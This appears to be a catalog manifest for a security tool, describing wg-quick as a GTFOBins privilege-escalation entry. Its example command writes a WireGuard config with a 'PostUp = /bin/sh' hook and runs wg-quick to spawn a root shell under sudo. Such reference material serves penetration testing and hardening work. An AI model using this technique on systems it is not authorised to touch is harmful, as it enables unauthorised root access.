---
id: network-vpn-wg-quick
namespace: network:vpn:wg-quick
name: wg-quick
description: Quick setup for WireGuard VPN tunnels; can spawn a shell.
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- wg-quick
parameters: []
features:
- interactive
- network-intensive
- process-manip
- requires-root
execution:
  template: wg-quick
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo)
  command: 'cat >/path/to/temp-file.conf <<EOF

    [Interface]

    PostUp = /bin/sh

    EOF


    wg-quick up /path/to/temp-file.conf'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/wg-quick/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: wireguard-tools
  commands:
  - apt-get install -y wireguard-tools
---

# wg-quick

wg-quick is a command-line utility. Quick setup for WireGuard VPN tunnels; can also spawn an interactive shell.
